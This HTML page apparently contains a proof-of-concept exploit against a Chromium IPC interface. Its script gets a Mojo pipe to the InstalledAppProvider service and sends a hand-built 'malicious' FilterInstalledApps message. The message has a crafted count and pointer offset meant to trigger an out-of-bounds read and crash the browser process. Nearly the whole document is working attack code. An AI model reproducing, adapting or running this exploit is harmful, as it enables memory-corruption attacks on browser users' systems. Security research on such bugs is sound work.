<!DOCTYPE html>
<html>
<head>
    <title>InstalledAppProvider via Browser Interface Broker</title>
</head>
<body>
    <h1>InstalledAppProvider OOB – via BrowserInterfaceBroker</h1>
    <pre id="log" style="background:#111;color:#0f0;padding:10px;"></pre>
    <script>
    (async () => {
        const log = (msg) => {
            document.getElementById('log').textContent += msg + '\n';
            console.log(msg);
        };

        try {
            let pipe;

            // Method 1: Use Mojo.browserInterfaceBroker (if available)
            if (Mojo.browserInterfaceBroker) {
                log('browserInterfaceBroker found');
                const {handle0: client, handle1: server} = Mojo.createMessagePipe();
                Mojo.browserInterfaceBroker.getInterface('blink.mojom.InstalledAppProvider', server);
                pipe = client;
                log('Got InstalledAppProvider via broker');
            }
            // Method 2: Fallback – try to intercept (may not fire, but we try)
            else if (typeof MojoInterfaceInterceptor !== 'undefined') {
                log('Trying interceptor...');
                const interceptor = new MojoInterfaceInterceptor('blink.mojom.InstalledAppProvider', 'process');
                interceptor.oninterfacerequest = (e) => {
                    interceptor.stop();
                    pipe = e.handle;
                    log('Got InstalledAppProvider via interceptor');
                };
                interceptor.start();
                // Trigger the request
                if (navigator.getInstalledRelatedApps) {
                    navigator.getInstalledRelatedApps().catch(() => {});
                }
                // Wait 2 seconds
                await new Promise(r => setTimeout(r, 2000));
                if (!pipe) {
                    throw new Error('Interceptor did not fire');
                }
            } else {
                throw new Error('No method available to get InstalledAppProvider');
            }

            // 2. Build the malicious FilterInstalledApps message
            const payload = new ArrayBuffer(256);
            const v = new DataView(payload);

            // Mojo message header (16 bytes)
            v.setUint32(0, 2, true);          // version
            v.setUint32(4, 0, true);          // flags
            v.setUint32(8, 0, true);          // ordinal = 0 (FilterInstalledApps)
            v.setUint32(12, 0, true);         // request_id

            // Payload layout (starting at offset 16) as expected by FUN_184cc1aa0:
            // offset 16: uint32 ? (ignored)
            // offset 20: uint32 count (must be >= 2 to trigger pointer arithmetic)
            // offset 24: uint64 relative_offset
            v.setUint32(20, 2, true);         // count = 2
            // Relative offset = 0x52 - (16+8) = 0x3A
            v.setBigInt64(24, BigInt(0x3A), true);

            // At computed array pointer (0x70), put a huge count
            v.setUint32(0x70, 0x1000, true);   // huge → OOB read

            // 3. Send the raw message
            pipe.writeMessage(payload, []);
            log('Malicious message sent! Browser should crash...');

            setInterval(() => {}, 10000);
        } catch (e) {
            log('Error: ' + e.message);
        }
    })();
    </script>
</body>
</html>
